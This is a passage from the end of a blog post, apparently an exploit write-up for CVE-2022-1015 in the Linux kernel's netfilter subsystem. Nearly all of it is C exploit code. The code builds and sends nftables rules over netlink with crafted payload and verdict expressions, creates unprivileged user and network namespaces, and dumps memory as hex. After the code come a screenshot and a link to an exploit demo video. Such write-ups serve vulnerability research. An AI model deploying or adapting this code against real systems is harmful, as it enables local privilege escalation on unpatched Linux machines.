</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">mnl_nlmsg_batch_size</span>(batch)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_send&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mnl_nlmsg_batch_stop</span>(batch);
</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_recvfrom</span>(nl, buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> (ret <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_cb_run</span>(buf, ret, chain_seq, portid, NULL, NULL);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>		ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_recvfrom</span>(nl, buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;error&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_socket_close</span>(nl);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> true;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">create_rule</span>(<span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span> r)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> mnl_socket <span style="color:#f92672">*</span>nl;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nlmsghdr <span style="color:#f92672">*</span>nlh;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> mnl_nlmsg_batch <span style="color:#f92672">*</span>batch;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buf[MNL_SOCKET_BUFFER_SIZE];
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint32_t</span> seq <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>(NULL);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> ret;
</span></span><span style="display:flex;"><span>	nl <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_open</span>(NETLINK_NETFILTER);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (nl <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_open&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mnl_socket_bind</span>(nl, <span style="color:#ae81ff">0</span>, MNL_SOCKET_AUTOPID) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_bind&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	batch <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_nlmsg_batch_start</span>(buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_batch_begin</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), seq<span style="color:#f92672">++</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
</span></span><span style="display:flex;"><span>	nlh <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_rule_nlmsg_build_hdr</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch),
</span></span><span style="display:flex;"><span>			NFT_MSG_NEWRULE,
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">nftnl_rule_get_u32</span>(r, NFTNL_RULE_FAMILY),
</span></span><span style="display:flex;"><span>			NLM_F_APPEND<span style="color:#f92672">|</span>NLM_F_CREATE<span style="color:#f92672">|</span>NLM_F_ACK, seq<span style="color:#f92672">++</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_rule_nlmsg_build_payload</span>(nlh, r);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_rule_free</span>(r);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_batch_end</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), seq<span style="color:#f92672">++</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_sendto</span>(nl, <span style="color:#a6e22e">mnl_nlmsg_batch_head</span>(batch),
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">mnl_nlmsg_batch_size</span>(batch));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_sendto&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_nlmsg_batch_stop</span>(batch);
</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_recvfrom</span>(nl, buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_recvfrom&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_cb_run</span>(buf, ret, <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">mnl_socket_get_portid</span>(nl), NULL, NULL);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_cb_run&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_socket_close</span>(nl);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> true;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">add_meta</span>(<span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span>r, <span style="color:#66d9ef">uint32_t</span> key, <span style="color:#66d9ef">uint32_t</span> dreg)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nftnl_expr <span style="color:#f92672">*</span>e;
</span></span><span style="display:flex;"><span>	e <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_expr_alloc</span>(<span style="color:#e6db74">&#34;meta&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (e <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;expr payload oom&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_META_KEY, key);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_META_DREG, dreg);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_rule_add_expr</span>(r, e);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">add_cmp</span>(<span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span>r, <span style="color:#66d9ef">uint32_t</span> sreg, <span style="color:#66d9ef">uint32_t</span> op,
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>data, <span style="color:#66d9ef">uint32_t</span> data_len)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nftnl_expr <span style="color:#f92672">*</span>e;
</span></span><span style="display:flex;"><span>	e <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_expr_alloc</span>(<span style="color:#e6db74">&#34;cmp&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (e <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;expr cmp oom&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_CMP_SREG, sreg);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_CMP_OP, op);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set</span>(e, NFTNL_EXPR_CMP_DATA, data, data_len);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_rule_add_expr</span>(r, e);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">add_payload</span>(<span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span>r, <span style="color:#66d9ef">uint32_t</span> base, <span style="color:#66d9ef">uint32_t</span> sreg, <span style="color:#66d9ef">uint32_t</span> dreg, <span style="color:#66d9ef">uint32_t</span> offset, <span style="color:#66d9ef">uint32_t</span> len)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nftnl_expr <span style="color:#f92672">*</span>e;
</span></span><span style="display:flex;"><span>	e <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_expr_alloc</span>(<span style="color:#e6db74">&#34;payload&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (e <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;expr payload oom&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_PAYLOAD_BASE, base);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(sreg <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_PAYLOAD_SREG, sreg);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(dreg <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_PAYLOAD_DREG, dreg);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_PAYLOAD_OFFSET, offset);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_PAYLOAD_LEN, len);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_rule_add_expr</span>(r, e);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">add_verdict</span>(<span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span>r, <span style="color:#66d9ef">int</span> verdict, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> chain, <span style="color:#66d9ef">u_int32_t</span> dreg)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nftnl_expr <span style="color:#f92672">*</span>e;
</span></span><span style="display:flex;"><span>	e <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_expr_alloc</span>(<span style="color:#e6db74">&#34;immediate&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (e <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;expr payload oom&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_IMM_DREG, dreg);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_expr_set_u32</span>(e, NFTNL_EXPR_IMM_VERDICT, verdict);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(chain)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">nftnl_expr_set_str</span>(e, NFTNL_EXPR_IMM_CHAIN, chain);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_rule_add_expr</span>(r, e);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">write_file</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>filename, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>text) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(filename, O_RDWR);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write</span>(fd, text, <span style="color:#a6e22e">strlen</span>(text));
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(fd);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">new_ns</span>(<span style="color:#66d9ef">void</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uid_t</span> uid <span style="color:#f92672">=</span> <span style="color:#a6e22e">getuid</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">gid_t</span> gid <span style="color:#f92672">=</span> <span style="color:#a6e22e">getgid</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">0x100</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">unshare</span>(CLONE_NEWUSER <span style="color:#f92672">|</span> CLONE_NEWNS)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34; [-] unshare(CLONE_NEWUSER | CLONE_NEWNS)&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">unshare</span>(CLONE_NEWNET)){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34; [-] unshare(CLONE_NEWNET)&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>       
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write_file</span>(<span style="color:#e6db74">&#34;/proc/self/setgroups&#34;</span>, <span style="color:#e6db74">&#34;deny&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">snprintf</span>(buffer, <span style="color:#66d9ef">sizeof</span>(buffer), <span style="color:#e6db74">&#34;0 %d 1&#34;</span>, uid);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write_file</span>(<span style="color:#e6db74">&#34;/proc/self/uid_map&#34;</span>, buffer);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">snprintf</span>(buffer, <span style="color:#66d9ef">sizeof</span>(buffer), <span style="color:#e6db74">&#34;0 %d 1&#34;</span>, gid);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write_file</span>(<span style="color:#e6db74">&#34;/proc/self/gid_map&#34;</span>, buffer);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifndef HEXDUMP_COLS
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define HEXDUMP_COLS 16
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hexdump</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>mem, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> len)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i, j;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> len <span style="color:#f92672">+</span> ((len <span style="color:#f92672">%</span> HEXDUMP_COLS) <span style="color:#f92672">?</span> (HEXDUMP_COLS <span style="color:#f92672">-</span> len <span style="color:#f92672">%</span> HEXDUMP_COLS) <span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>); i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/* print offset */</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(i <span style="color:#f92672">%</span> HEXDUMP_COLS <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;0x%06x: &#34;</span>, i);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/* print hex data */</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(i <span style="color:#f92672">&lt;</span> len)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%02x &#34;</span>, <span style="color:#ae81ff">0xFF</span> <span style="color:#f92672">&amp;</span> ((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)mem)[i]);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span> <span style="color:#75715e">/* end of block, just aligning for ASCII dump */</span>
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;   &#34;</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/* print ASCII dump */</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(i <span style="color:#f92672">%</span> HEXDUMP_COLS <span style="color:#f92672">==</span> (HEXDUMP_COLS <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">for</span>(j <span style="color:#f92672">=</span> i <span style="color:#f92672">-</span> (HEXDUMP_COLS <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>); j <span style="color:#f92672">&lt;=</span> i; j<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span>(j <span style="color:#f92672">&gt;=</span> len) <span style="color:#75715e">/* end of block, not really printing */</span>
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">putchar</span>(<span style="color:#e6db74">&#39; &#39;</span>);
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isprint</span>(((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)mem)[j])) <span style="color:#75715e">/* printable char */</span>
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">putchar</span>(<span style="color:#ae81ff">0xFF</span> <span style="color:#f92672">&amp;</span> ((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)mem)[j]);        
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">else</span> <span style="color:#75715e">/* other char */</span>
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">putchar</span>(<span style="color:#e6db74">&#39;.&#39;</span>);
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">putchar</span>(<span style="color:#e6db74">&#39;\n&#39;</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><img loading="lazy" src="/blog/CVE-2022-1015_Linux_kernel/4d4e0b48df944c92db3debb4403080f1.png" alt=""  />

<a href="https://youtube.com/shorts/z0n_A8paaqU">https://youtube.com/shorts/z0n_A8paaqU</a> Exploit</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://msh1307.kr/tags/linux-kernel/">Linux kernel</a></li>
      <li><a href="https://msh1307.kr/tags/cve-2022-1015/">CVE-2022-1015</a></li>
      <li><a href="https://msh1307.kr/tags/netfilter/">netfilter</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://msh1307.kr">msh1307</a></span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
